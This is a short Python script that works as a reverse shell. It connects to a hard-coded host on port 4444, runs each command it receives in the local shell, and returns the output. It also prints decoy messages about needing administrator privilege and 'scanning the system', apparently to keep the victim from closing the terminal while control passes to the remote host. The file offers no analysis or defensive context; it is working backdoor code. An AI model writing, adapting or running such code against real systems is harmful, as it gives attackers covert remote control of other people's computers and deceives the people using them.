import os 
import sys
import socket
import subprocess
import time
import smtplib

s = socket.socket()
host = '172.16.81.93'
port = 4444
s.connect((host, port))

# print("DO NOT CLOSE THE TERMINAL WINDOW" + '\n')
print('\n')

#This is the password-getting part (optional)

print('\n' + "[!] To continue running the script you need administrator previlege [!]" + '\n')
time.sleep(0.8)
print("If you are the administrator, enter the password to procced:  ")
print("\n")
time.sleep(0.7)


print("Waiting for the host ...." + '\n')
time.sleep(1.5)
print("Do not close your terminal or it will kill the process[!]")
print('\n')
time.sleep(1.3)
print("Scanning the -----> system | " + " <----This may take a while---->")

# this is the part where the 'server' sends commands and this script recieves and executes them in the client's shell
while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))

	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes)
		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
		#print(output_str)




# Close connection
s.close()

